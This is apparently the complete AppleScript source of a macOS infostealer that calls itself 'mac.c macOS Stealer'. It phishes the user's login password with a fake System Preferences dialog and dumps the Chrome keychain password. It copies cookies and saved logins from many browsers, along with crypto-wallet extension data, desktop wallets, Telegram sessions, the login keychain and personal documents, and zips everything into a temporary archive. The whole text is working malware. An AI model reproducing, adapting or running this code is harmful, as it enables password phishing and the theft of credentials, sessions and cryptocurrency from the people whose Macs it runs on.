on filesizer(paths)
	set fsz to 0
	try
		set theItem to quoted form of POSIX path of paths
		set fsz to (do shell script "/usr/bin/mdls -name kMDItemFSSize -raw " & theItem)
	end try
	return fsz
end filesizer

on mkdir(someItem)
	try
		set filePosixPath to quoted form of (POSIX path of someItem)
		do shell script "mkdir -p " & filePosixPath
	end try
end mkdir

on FileName(filePath)
	try
		set reversedPath to (reverse of every character of filePath) as string
		set trimmedPath to text 1 thru ((offset of "/" in reversedPath) - 1) of reversedPath
		set finalPath to (reverse of every character of trimmedPath) as string
		return finalPath
	end try
end FileName

on BeforeFileName(filePath)
	try
		set lastSlash to offset of "/" in (reverse of every character of filePath) as string
		set trimmedPath to text 1 thru -(lastSlash + 1) of filePath
		return trimmedPath
	end try
end BeforeFileName

on writeText(textToWrite, filePath)
	try
		set folderPath to BeforeFileName(filePath)
		mkdir(folderPath)
		set fileRef to (open for access filePath with write permission)
		write textToWrite to fileRef starting at eof
		close access fileRef
	end try
end writeText

on readwrite(path_to_file, path_as_save)
	try
		set fileContent to read path_to_file
		set folderPath to BeforeFileName(path_as_save)
		mkdir(folderPath)
		do shell script "cat " & quoted form of path_to_file & " > " & quoted form of path_as_save
	end try
end readwrite

on isDirectory(someItem)
	try
		set filePosixPath to quoted form of (POSIX path of someItem)
		set fileType to (do shell script "file -b " & filePosixPath)
		if fileType ends with "directory" then
			return true
		end if
		return false
	end try
end isDirectory

on GrabFolderLimit(sourceFolder, destinationFolder)
	try
		set bankSize to 0
		set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews"}
		set fileList to list folder sourceFolder without invisibles
		mkdir(destinationFolder)
		repeat with currentItem in fileList
			if currentItem is not in exceptionsList then
				set itemPath to sourceFolder & "/" & currentItem
				set savePath to destinationFolder & "/" & currentItem
				if isDirectory(itemPath) then
					GrabFolderLimit(itemPath, savePath)
				else
					set fsz to filesizer(itemPath)
					set bankSize to bankSize + fsz
					if bankSize < 100 * 1024 * 1024 then
						readwrite(itemPath, savePath)
					end if
				end if
			end if
		end repeat
	end try
end GrabFolderLimit

on GrabFolder(sourceFolder, destinationFolder)
	try
		set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews", "dumps", "emoji", "user_data", "__update__"}
		set fileList to list folder sourceFolder without invisibles
		mkdir(destinationFolder)
		repeat with currentItem in fileList
			if currentItem is not in exceptionsList then
				set itemPath to sourceFolder & "/" & currentItem
				set savePath to destinationFolder & "/" & currentItem
				if isDirectory(itemPath) then
					GrabFolder(itemPath, savePath)
				else
					readwrite(itemPath, savePath)
				end if
			end if
		end repeat
	end try
end GrabFolder

on checkvalid(username, password_entered)
	try
		set result to do shell script "dscl . authonly " & quoted form of username & space & quoted form of password_entered
		if result is not equal to "" then
			return false
		else
			return true
		end if
	on error
		return false
	end try
end checkvalid

on getpwd(username, writemind)
	try
		if checkvalid(username, "") then
			set result to do shell script "security 2>&1 > /dev/null find-generic-password -ga \"Chrome\" | awk \"{print $2}\""
			writeText(result as string, writemind & "masterpass-chrome")
		else
			repeat
				set result to display dialog "To run the application you need to change the settings for its operation." default answer "" with icon caution buttons {"Continue"} default button "Continue" giving up after 150 with title "System Preferences" with hidden answer
				set password_entered to text returned of result
				if checkvalid(username, password_entered) then
					writeText(password_entered, writemind & "Password")
					return password_entered
				end if
			end repeat
		end if
	end try
	return ""
end getpwd

on grabPlugins(paths, savePath, pluginList, index)
	try
		set fileList to list folder paths without invisibles
		repeat with PFile in fileList
			repeat with Plugin in pluginList
				if (PFile contains Plugin) then
					set newpath to paths & PFile
					set newsavepath to savePath & "/" & Plugin
					if index then
						set newsavepath to newsavepath & "/IndexedDB/"
					end if
					GrabFolder(newpath, newsavepath)
				end if
			end repeat
		end repeat
	end try
end grabPlugins

on chromium(writemind, chromium_map)
	set pluginList to {"keenhcnmdmjjhincpilijphpiohdppno", "hbbgbephgojikajhfbomhlmmollphcad", "cjmkndjhnagcfbpiemnkdpomccnjblmj", "dhgnlgphgchebgoemcjekedjjbifijid", "hifafgmccdpekplomjjkcfgodnhcellj", "kamfleanhcmjelnhaeljonilnmjpkcjc", "jnldfbidonfeldmalbflbmlebbipcnle", "fdcnegogpncmfejlfnffnofpngdiejii", "klnaejjgbibmhlephnhpmaofohgkpgkd", "pdadjkfkgcafgbceimcpbkalnfnepbnk", "kjjebdkfeagdoogagbhepmbimaphnfln", "ldinpeekobnhjjdofggfgjlcehhmanlj", "dkdedlpgdmmkkfjabffeganieamfklkm", "bcopgchhojmggmffilplmbdicgaihlkp", "kpfchfdkjhcoekhdldggegebfakaaiog", "idnnbdplmphpflfnlkomgpfbpcgelopg", "mlhakagmgkmonhdonhkpjeebfphligng", "bipdhagncpgaccgdbddmbpcabgjikfkn", "gcbjmdjijjpffkpbgdkaojpmaninaion", "nhnkbkgjikgcigadomkphalanndcapjk", "bhhhlbepdkbapadjdnnojkbgioiodbic", "hoighigmnhgkkdaenafgnefkcmipfjon", "klghhnkeealcohjjanjjdaeeggmfmlpl", "nkbihfbeogaeaoehlefnkodbefgpgknn", "fhbohimaelbohpjbbldcngcnapndodjp", "ebfidpplhabeedpnhjnobghokpiioolj", "emeeapjkbcbpbpgaagfchmcgglmebnen", "fldfpgipfncgndfolcbkdeeknbbbnhcc", "penjlddjkjgpnkllboccdgccekpkcbin", "fhilaheimglignddkjgofkcbgekhenbh", "hmeobnfnfcmdkdcmlblgagmfpfboieaf", "cihmoadaighcejopammfbmddcmdekcje", "lodccjjbdhfakaekdiahmedfbieldgik", "omaabbefbmiijedngplfjmnooppbclkk", "cjelfplplebdjjenllpjcblmjkfcffne", "jnlgamecbpmbajjfhmmmlhejkemejdma", "fpkhgmpbidmiogeglndfbkegfdlnajnf", "bifidjkcdpgfnlbcjpdkdcnbiooooblg", "amkmjjmmflddogmhpjloimipbofnfjih", "flpiciilemghbmfalicajoolhkkenfel", "hcflpincpppdclinealmandijcmnkbgn", "aeachknmefphepccionboohckonoeemg", "nlobpakggmbcgdbpjpnagmdbdhdhgphk", "momakdpclmaphlamgjcndbgfckjfpemp", "mnfifefkajgofkcjkemidiaecocnkjeh", "fnnegphlobjdpkhecapkijjdkgcjhkib", "ehjiblpccbknkgimiflboggcffmpphhp", "ilhaljfiglknggcoegeknjghdgampffk", "pgiaagfkgcbnmiiolekcfmljdagdhlcm", "fnjhmkhhmkbjkkabndcnnogagogbneec", "bfnaelmomeimhlpmgjnjophhpkkoljpa", "imlcamfeniaidioeflifonfjeeppblda", "mdjmfdffdcmnoblignmgpommbefadffd", "ooiepdgjjnhcmlaobfinbomgebfgablh", "pcndjhkinnkaohffealmlmhaepkpmgkb", "ppdadbejkmjnefldpcdjhnkpbjkikoip", "cgeeodpfagjceefieflmdfphplkenlfk", "dlcobpjiigpikoobohmabehhmhfoodbb", "jiidiaalihmmhddjgbnbgdfflelocpak", "bocpokimicclpaiekenaeelehdjllofo", "pocmplpaccanhmnllbbkpgfliimjljgo", "cphhlgmgameodnhkjdmkpanlelnlohao", "mcohilncbfahbmgdjkbpemcciiolgcge", "bopcbmipnjdcdfflfgjdgdjejmgpoaab", "khpkpbbcccdmmclmpigdgddabeilkdpd", "ejjladinnckdgjemekebdpeokbikhfci", "phkbamefinggmakgklpkljjmgibohnba", "epapihdplajcdnnkdeiahlgigofloibg", "hpclkefagolihohboafpheddmmgdffjm", "cjookpbkjnpkmknedggeecikaponcalb", "cpmkedoipcpimgecpmgpldfpohjplkpp", "modjfdjcodmehnpccdjngmdfajggaoeh", "ibnejdfjmmkpcnlpebklmnkoeoihofec", "afbcbjpbpfadlkmhmclhkeeodmamcflc", "kncchdigobghenbbaddojjnnaogfppfj", "efbglgofoippbgcjepnhiblaibcnclgk", "mcbigmjiafegjnnogedioegffbooigli", "fccgmnglbhajioalokbcidhcaikhlcpm", "hnhobjmcibchnmglfbldbfabcgaknlkj", "apnehcjmnengpnmccpaibjmhhoadaico", "enabgbdfcbaehmbigakijjabdpdnimlg", "mgffkfbidihjpoaomajlbgchddlicgpn", "fopmedgnkfpebgllppeddmmochcookhc", "jojhfeoedkpkglbfimdfabpdfjaoolaf", "ammjlinfekkoockogfhdkgcohjlbhmff", "abkahkcbhngaebpcgfmhkoioedceoigp", "dcbjpgbkjoomeenajdabiicabjljlnfp", "gkeelndblnomfmjnophbhfhcjbcnemka", "pnndplcbkakcplkjnolgbkdgjikjednm", "copjnifcecdedocejpaapepagaodgpbh", "hgbeiipamcgbdjhfflifkgehomnmglgk", "mkchoaaiifodcflmbaphdgeidocajadp", "ellkdbaphhldpeajbepobaecooaoafpg", "mdnaglckomeedfbogeajfajofmfgpoae", "nknhiehlklippafakaeklbeglecifhad", "ckklhkaabbmdjkahiaaplikpdddkenic", "fmblappgoiilbgafhjklehhfifbdocee", "nphplpgoakhhjchkkhmiggakijnkhfnd", "cnmamaachppnkjgnildpdmkaakejnhae", "fijngjgcjhjmmpcmkeiomlglpeiijkld", "niiaamnmgebpeejeemoifgdndgeaekhe", "odpnjmimokcmjgojhnhfcnalnegdjmdn", "lbjapbcmmceacocpimbpbidpgmlmoaao", "hnfanknocfeofbddgcijnmhnfnkdnaad", "hpglfhgfnhbgpjdenjgmdgoeiappafln", "egjidjbpglichdcondbcbdnbeeppgdph", "ibljocddagjghmlpgihahamcghfggcjc", "gkodhkbmiflnmkipcmlhhgadebbeijhh", "dbgnhckhnppddckangcjbkjnlddbjkna", "mfhbebgoclkghebffdldpobeajmbecfk", "nlbmnnijcnlegkjjpcfjclmcfggfefdm", "nlgbhdfgdhgbiamfdfmbikcdghidoadd", "acmacodkjbdgmoleebolmdjonilkdbch", "agoakfejjabomempkjlepdflaleeobhb", "dgiehkgfknklegdhekgeabnhgfjhbajd", "onhogfjeacnfoofkfgppdlbmlmnplgbn", "kkpehldckknjffeakihjajcjccmcjflh", "jaooiolkmfcmloonphpiiogkfckgciom", "ojggmchlghnjlapmfbnjholfjkiidbch", "pmmnimefaichbcnbndcfpaagbepnjaig", "oiohdnannmknmdlddkdejbmplhbdcbee", "aiifbnbfobpmeekipheeijimdpnlpgpp", "aholpfdialjgjfhomihkjbmgjidlcdno", "anokgmphncpekkhclmingpimjmcooifb", "kkpllkodjeloidieedojogacfhpaihoh", "iokeahhehimjnekafflcihljlcjccdbe", "ifckdpamphokdglkkdomedpdegcjhjdp", "loinekcabhlmhjjbocijdoimmejangoa", "fcfcfllfndlomdhbehjjcoimbgofdncg", "ifclboecfhkjbpmhgehodcjpciihhmif", "dmkamcknogkgcdfhhbddcghachkejeap", "ookjlbkiijinhpmnjffcofjonbfbgaoc", "oafedfoadhdjjcipmcbecikgokpaphjk", "mapbhaebnddapnmifbbkgeedkeplgjmf", "cmndjbecilbocjfkibfbifhngkdmjgog", "kpfopkelmapcoipemfendmdcghnegimn", "lgmpcpglpngdoalbgeoldeajfclnhafa", "ppbibelpcjmhbdihakflkdcoccbgbkpo", "ffnbelfdoeiohenkjibnmadjiehjhajb", "opcgpfmipidbgpenhmajoajpbobppdil", "lakggbcodlaclcbbbepmkpdhbcomcgkd", "kgdijkcfiglijhaglibaidbipiejjfdp", "hdkobeeifhdplocklknbnejdelgagbao", "lnnnmfcpbkafcpgdilckhmhbkkbpkmid", "nbdhibgjnjpnkajaghbffjbkcgljfgdi", "kmhcihpebfmpgmihbkipmjlmmioameka", "kmphdnilpmdejikjdnlbcnmnabepfgkh", "nngceckbapebfimnlniiiahkandclblb"}
	set chromiumFiles to {"/Network/Cookies", "/Cookies", "/Web Data", "/Login Data", "/Local Extension Settings/", "/IndexedDB/"}
	repeat with chromium in chromium_map
		set savePath to writemind & "Browsers/" & item 1 of chromium & "_"
		try
			set fileList to list folder item 2 of chromium without invisibles
			repeat with currentItem in fileList
				if ((currentItem as string) is equal to "Default") or ((currentItem as string) contains "Profile") then
					repeat with CFile in chromiumFiles
						set readpath to (item 2 of chromium & currentItem & CFile)
						if ((CFile as string) is equal to "/Network/Cookies") then
							set CFile to "/Cookies"
						end if
						if ((CFile as string) is equal to "/Local Extension Settings/") then
							grabPlugins(readpath, writemind & "Extensions/", pluginList, false)
						else if (CFile as string) is equal to "/IndexedDB/" then
							grabPlugins(readpath, writemind & "Extensions/", pluginList, true)
						else
							set writepath to savePath & currentItem & CFile
							readwrite(readpath, writepath)
						end if
					end repeat
				end if
			end repeat
		end try
	end repeat
end chromium

on telegram(writemind, library)
		try
			GrabFolder(library & "Telegram Desktop/tdata/", writemind & "Telegram Desktop/")
		end try
end telegram

on Cryptowallets(writemind, deskwals)
	repeat with deskwal in deskwals
		try
			GrabFolder(item 2 of deskwal, writemind & item 1 of deskwal)
		end try
	end repeat
end Cryptowallets

on filegrabber(writemind)
 try
  set destinationFolderPath to POSIX file (writemind & "FileGrabber/")
  mkdir(destinationFolderPath)
  set extensionsList to {"pdf", "docx", "doc", "wallet", "keys", "db", "txt", "seed"}
  set bankSize to 0
  set fileCounter to 1
  
  tell application "Finder"
   try
    set desktopFiles to every file of desktop
    set documentsFiles to every file of folder "Documents" of (path to home folder)
    set downloadsFiles to every file of folder "Downloads" of (path to home folder)
    
    repeat with aFile in (desktopFiles & documentsFiles & downloadsFiles)
     set fileExtension to name extension of aFile
     if fileExtension is in extensionsList then
      set filesize to size of aFile
      if (bankSize + filesize) < 10 * 1024 * 1024 then
       try
        set newFileName to (fileCounter as string) & "." & fileExtension
        duplicate aFile to folder destinationFolderPath with replacing
        set destFolderAlias to destinationFolderPath as alias
        tell application "Finder"
         set copiedFiles to every file of folder destFolderAlias
         set lastCopiedFile to item -1 of copiedFiles
         set name of lastCopiedFile to newFileName
        end tell
        
        set bankSize to bankSize + filesize
        set fileCounter to fileCounter + 1
       end try
      else
       exit repeat
      end if
     end if
    end repeat
   end try
  end tell
 end try
end filegrabber

set username to (system attribute "USER")
set profile to "/Users/" & username
set randomNumber to do shell script "echo $((RANDOM % 9000000 + 1000000))"
set writemind to "/tmp/" & randomNumber & "/"

set library to profile & "/Library/Application Support/"
set password_entered to getpwd(username, writemind)

delay 0.01

set chromiumMap to {{"Yandex", library & "Yandex/YandexBrowser"}, {"Chrome", library & "Google/Chrome/"}, {"Brave", library & "BraveSoftware/Brave-Browser/"}, {"Edge", library & "Microsoft Edge/"}, {"Vivaldi", library & "Vivaldi/"}, {"Opera", library & "com.operasoftware.Opera/"}, {"OperaGX", library & "com.operasoftware.OperaGX/"}, {"Chrome Beta", library & "Google/Chrome Beta/"}, {"Chrome Canary", library & "Google/Chrome Canary"}, {"Chromium", library & "Chromium/"}, {"Chrome Dev", library & "Google/Chrome Dev/"}, {"Arc", library & "Arc/User Data"}, {"Coccoc", library & "CocCoc/Browser/"}}

set walletMap to {{"Cryptowallets/Electrum", profile & "/.electrum/wallets/"}, {"Cryptowallets/Coinomi", library & "Coinomi/wallets/"}, {"Cryptowallets/Exodus", library & "Exodus/"}, {"Cryptowallets/Atomic", library & "atomic/Local Storage/leveldb/"}, {"Cryptowallets/Wasabi", profile & "/.walletwasabi/client/Wallets/"}, {"Cryptowallets/Ledger_Live", library & "Ledger Live/"}, {"Cryptowallets/Monero", profile & "/Monero/wallets/"}, {"Cryptowallets/Bitcoin_Core", library & "Bitcoin/wallets/"}, {"Cryptowallets/Litecoin_Core", library & "Litecoin/wallets/"}, {"Cryptowallets/Dash_Core", library & "DashCore/wallets/"}, {"Cryptowallets/Electrum_LTC", profile & "/.electrum-ltc/wallets/"}, {"Cryptowallets/Electron_Cash", profile & "/.electron-cash/wallets/"}, {"Cryptowallets/Guarda", library & "Guarda/"}, {"Cryptowallets/Dogecoin_Core", library & "Dogecoin/wallets/"}, {"Cryptowallets/Trezor_Suite", library & "@trezor/suite-desktop/"}}

readwrite(library & "Binance/app-store.json", writemind & "Cryptowallets/Binance/app-store.json")
readwrite(library & "@tonkeeper/desktop/config.json", writemind & "Cryptowallets/TonKeeper/config.json")
readwrite(profile & "/Library/Keychains/login.keychain-db", writemind & "login.keychain-db")

writeText(username, writemind & "Username")
writeText("1.3.2_release (x86_64 & ARM64)", writemind & "Version")

try
	writeText("mac.c macOS Stealer\n\n", writemind & "info")
	writeText("Build Tag: release\n", writemind & "info")
	writeText("Version: 1.3.2_release (x86_64 & ARM64)\n\n", writemind & "info")
	writeText("Username: " & username, writemind & "info")
	writeText("\nPassword: " & password_entered & "\n\n", writemind & "info")
	set result to (do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType")
	writeText(result, writemind & "info")
end try

filegrabber(writemind)

chromium(writemind, chromiumMap)
Cryptowallets(writemind, walletMap)
telegram(writemind, library)

do shell script "ditto -c -k --sequesterRsrc " & writemind & " /tmp/telemetry.zip"

